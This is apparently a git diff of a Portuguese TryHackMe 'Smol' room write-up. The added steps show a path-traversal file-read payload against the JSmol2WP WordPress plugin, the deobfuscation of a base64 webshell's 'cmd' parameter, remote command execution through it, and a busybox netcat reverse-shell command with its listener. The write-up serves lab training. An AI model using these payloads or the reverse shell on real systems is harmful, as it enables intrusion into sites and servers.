@@ -1,4 +1,4 @@
-![250603_12h28m34s_screenshot](https://github.com/user-attachments/assets/fcd1af3b-6fc8-4000-927b-36600fecd036)# Room - SMOL - TryHackMe 
+# Room - SMOL - TryHackMe 
 Autor: carlossb1\
 Nível: Médio\
 Tópico: Web / Linux
@@ -108,9 +108,47 @@ Tentei utilizar o seguinte payload para ler o código do plugin no server:
 
 `http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello-dolly/hello.php`
 
+Depois de entrar num loophole enorme, encontrei essa thread de discussão dos desenvolvedores, que fala justamente sobre essa característica do plugin:
 
+https://core.trac.wordpress.org/ticket/53323
 
+![250603_13h30m22s_screenshot](https://github.com/user-attachments/assets/aff31b1b-511a-4a3e-b50b-99ecbe3fe8e4)
 
+Resumindo a thread, nas versões antigas, o plugin não ficava dentro de uma pasta própria, indo contra as boas práticas indicadas pelos desenvolvedores. Foi feito um esforço para alterar essa condição nas versões mais novas, mas parece que no nosso alvo a versão ainda não está atualizada.
+
+Então editamos nosso payload para acessar o código do plugin:
+
+`http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php`
+
+![250603_13h34m03s_screenshot](https://github.com/user-attachments/assets/f4670307-9c72-486b-8d59-cafbef9c019a)
+
+Achamos o backdoor dentro do código, um webshell codificado em base64:
+
+![250603_13h35m18s_screenshot](https://github.com/user-attachments/assets/56f9ffc1-0748-4185-9d5e-ecce46e8d9f8)
+
+Depois de decodificar o b64, os caracteres que recebem o comando ainda continuam obfuscados. 
+
+Convertendo os dois caracteres hexadecimais para ascii, obtemos: [ ][x6d][x64] - > [ ][m][d]
+Por aqui já dava pra chutar que o parâmetro seria "cmd". O 143 não é conversível de decimal para ASCII, depois de procurar um pouco, vi que convertendo de octal para ASCII, conseguimos identificar o último caractere, que de fato é o "c".
+
+Vamos testar a execução de código:
+
+`http://www.smol.thm/wp-admin.php/about.php?cmd=ls`
+
+![250603_14h09m44s_screenshot](https://github.com/user-attachments/assets/b72ea9a0-1684-4367-8508-57084dedc416)
+
+Conseguimos utilizar o backdoor com sucesso para execução de código remoto.
+
+## Exfiltrando o banco de dados
+
+Agora que temos RCE, vamos pegar uma shell na máquina:
+(Eu tenho usado bastante o busybox para invocar o netcat, nessas rooms ele geralmente está se mostrando o mais consistente pra mim.)
+
+no site: `http://www.smol.thm/wp-admin.php/about.php?cmd=busybox nc <ip> <porta> -e sh` 
+
+na máquina: `nc -lvnp <porta>`
+
+![250603_14h15m31s_screenshot](https://github.com/user-attachments/assets/d09a8e46-e28f-4070-bb29-c853e76ea494)
 
 
 
